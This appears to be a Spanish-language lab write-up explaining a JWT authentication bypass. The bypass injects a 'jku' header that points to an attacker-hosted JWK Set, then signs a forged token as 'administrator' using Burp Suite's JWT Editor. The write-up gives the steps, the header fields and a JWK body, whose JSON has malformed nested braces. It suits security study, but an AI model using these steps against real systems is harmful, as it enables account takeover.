# Bypass de autenticación JWT por inyección en jku

Tags: #JWT #BurpSuite #JKU #Asimétrico 

```bash 
1. Descargar el 'JWT Editor' en Burpsuite
```

```bash 
En esta lab, se explota una vulnerabilidad relacionada con el parámetro 'jku' del encabezado de un JWT. Este parámetro permite al servidor obtener dinámicamente la clave pública desde una URL externa para verificar la firma del token. El fallo consiste en que el servidor no valida si esa URL pertenece a un dominio confiable.

Se crea un conjunto de claves (JWK Set) en un servidor que se controla y se coloca nuestra clave pública en él. Luego se genera un JWT firmado con la clave privada correspondiente, indicando en el 'jku' la ubicación de nuestra clave pública y configurando el token para suplantar al administrador.

El servidor acepta la clave, valida el token, y se accede al panel de administración. Este lab demuestra cómo la confianza ciega en ubicaciones externas puede comprometer completamente la autenticación.
```
## Crear un JWT válido con JKU

```bash 
1. En la parte de 'JSON Web Token' del Proxy se modifica el 'Header' agregando lo siguiente debajo de 'alg':
   "kid": "7438d940-a7e3-400a-854e-99f2cff4b2c8",
   "alg": "RS256",
   "jku": "url_exploit_server"


2. Modificar el campo del 'Payload':
   
    Header    .       Payload       .    Signature
    aaaaaa    .    administrator    .      cccccc

3. Para finalizar, se firma dando click en 'sign' seleccionando el JWK creado anteriormente y dando click en 'ok'


Notas:
	1. El valor de 'kid' se obtiene de un 'jwk' en el 'jwt editor' generado de un 'New RSA Key' 
	2. El 'jku' es la url del server malicioso que contendra las llaves públicas 
```

## Crear un JWK con llave pública Asimétrico válido con 'JWT Editor' en Burpsuite 

```bash 
1. En algoritmos asimétricos se puede usar 'JWT Editor':
	- Dar click en 'New RSA Key'
	- Seleccionar 'JWK' y dar click en 'Generate' y dar click en 'ok'
	- Dar click derecho en el 'ID' y seleccionar 'Copy Public key as JWK' para agregarlo al exploit server en la parte del body
```

## Configurar el exploit server 

```bash 
1. Colocar lo siguiente en la parte del body 
   
{
	"keys": [
		{
			{
    "kty": "RSA",
    "e": "AQAB",
    "kid": "7438d940-a7e3-400a-854e-99f2cff4b2c8",
    "n": "rG1lRI1EO3DXBMRKrftvIwjU61NWYi4kGrazGLXeiKDKYuTOi2qYgu7nF1eEimIqbEbv1Z_SRK0x6UEFZeS_RZ7fvqJx7VP9R80SEsm7lUjY6vq-UUZQdJl1PCc1yMupqRQAkX7MvuniQS1HzKXrnte0rP-sWKpBCmXRZeGKp3eRZ600GsSv7QhgZb84fxt5wB2Gfy43bAYT9dURK9TNYi021zwQvxd-H6UMax6-seE-n-aL19EspSTxPZgYC4jW3VKqI7kqu6Kbwq1exIlKxGao0XpobyG391zVsQMmg5hV6MTc-CV12JM8j8KPOn1DPrJc87DsuKKMhBwUIbNpYQ"
}
		}
	]
}	
```